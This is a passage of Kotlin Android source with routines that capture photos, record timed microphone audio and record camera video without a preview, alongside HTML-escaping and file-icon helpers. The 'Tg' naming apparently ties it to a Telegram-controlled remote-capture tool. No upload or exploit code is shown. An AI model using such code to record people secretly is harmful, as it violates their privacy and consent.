                                                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)
                                            }
                                            session.capture(req.build(), null, handler)
                                        } catch (e: Exception) {
                                            cleanup()
                                            if (cont.isActive) cont.resume(null)
                                        }
                                    }
                                    override fun onConfigureFailed(session: android.hardware.camera2.CameraCaptureSession) {
                                        cleanup()
                                        if (cont.isActive) cont.resume(null)
                                    }
                                }, handler
                            )
                        } catch (e: Exception) {
                            cleanup()
                            if (cont.isActive) cont.resume(null)
                        }
                    }
                    override fun onDisconnected(camera: CameraDevice) {
                        cleanup()
                        if (cont.isActive && !cont.isCompleted) cont.resume(null)
                    }
                    override fun onError(camera: CameraDevice, error: Int) {
                        cleanup()
                        if (cont.isActive && !cont.isCompleted) cont.resume(null)
                    }
                }, handler)
            } catch (e: Exception) {
                LogCat.e("TgCamera capturePhoto: ${e.message}")
                cleanup()
                if (cont.isActive) cont.resume(null)
            }
        }
    }

    private suspend fun recordAudio(context: Context, seconds: Int): File? {
        val file = File(context.cacheDir, "tg_audio_${System.currentTimeMillis()}.m4a")
        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION") MediaRecorder()
        }
        return try {
            recorder.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            delay(seconds * 1000L)
            recorder.stop()
            recorder.release()
            if (file.exists() && file.length() > 0) file else null
        } catch (e: Exception) {
            LogCat.e("TgAudio recordAudio: ${e.message}")
            try { recorder.release() } catch (_: Throwable) {}
            null
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun recordVideo(context: Context, seconds: Int, useFront: Boolean): File? {
        val file = File(context.cacheDir, "tg_video_${System.currentTimeMillis()}.mp4")
        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION") MediaRecorder()
        }
        return suspendCancellableCoroutine { cont ->
            val handlerThread = HandlerThread("TgVideoCapture").apply { start() }
            val handler = Handler(handlerThread.looper)
            var cameraDevice: CameraDevice? = null
            var surface: android.view.Surface? = null

            fun cleanup() {
                try { cameraDevice?.close() } catch (_: Throwable) {}
                try { recorder.release() } catch (_: Throwable) {}
                try { surface?.release() } catch (_: Throwable) {}
                try { handlerThread.quitSafely() } catch (_: Throwable) {}
            }

            cont.invokeOnCancellation { cleanup() }

            try {
                recorder.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setVideoSource(MediaRecorder.VideoSource.SURFACE)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setVideoSize(1280, 720)
                    setVideoFrameRate(30)
                    setOutputFile(file.absolutePath)
                    prepare()
                }
                surface = recorder.surface

                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val facing = if (useFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
                val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                    cameraManager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == facing
                } ?: cameraManager.cameraIdList.firstOrNull() ?: run {
                    cleanup()
                    if (cont.isActive) cont.resume(null)
                    return@suspendCancellableCoroutine
                }

                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        try {
                            camera.createCaptureSession(
                                listOf(surface!!),
                                object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: android.hardware.camera2.CameraCaptureSession) {
                                        try {
                                            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                                                addTarget(surface!!)
                                                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                                            }
                                            session.setRepeatingRequest(req.build(), null, handler)
                                            recorder.start()
                                            handler.postDelayed({
                                                try {
                                                    recorder.stop()
                                                } catch (_: Throwable) {}
                                                cleanup()
                                                if (cont.isActive) cont.resume(if (file.exists() && file.length() > 0) file else null)
                                            }, seconds * 1000L)
                                        } catch (e: Exception) {
                                            cleanup()
                                            if (cont.isActive) cont.resume(null)
                                        }
                                    }
                                    override fun onConfigureFailed(session: android.hardware.camera2.CameraCaptureSession) {
                                        cleanup()
                                        if (cont.isActive) cont.resume(null)
                                    }
                                }, handler
                            )
                        } catch (e: Exception) {
                            cleanup()
                            if (cont.isActive) cont.resume(null)
                        }
                    }
                    override fun onDisconnected(camera: CameraDevice) {
                        cleanup()
                        if (cont.isActive && !cont.isCompleted) cont.resume(null)
                    }
                    override fun onError(camera: CameraDevice, error: Int) {
                        cleanup()
                        if (cont.isActive && !cont.isCompleted) cont.resume(null)
                    }
                }, handler)
            } catch (e: Exception) {
                LogCat.e("TgVideo recordVideo: ${e.message}")
                cleanup()
                if (cont.isActive) cont.resume(null)
            }
        }
    }

    private fun htmlEsc(s: String?): String {
        if (s.isNullOrEmpty()) return ""
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    }

    private fun fmtTime(epochMs: Long): String =
        SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(epochMs))

    private fun fileIcon(name: String): String {
        val ext = name.substringAfterLast('.', "").lowercase()
        return when (ext) {
            "jpg", "jpeg", "png", "gif", "webp", "bmp" -> "🖼"
            "mp4", "mkv", "avi", "mov", "webm" -> "🎬"
            "mp3", "aac", "ogg", "wav", "flac", "m4a" -> "🎵"
            "pdf" -> "📄"
            "doc", "docx" -> "📝"
            "xls", "xlsx" -> "📊"
            "ppt", "pptx" -> "📋"
            "zip", "rar", "7z", "tar", "gz" -> "📦"
            "apk" -> "📲"
            "txt", "log" -> "📃"
            else -> "📄"
        }
    }
}
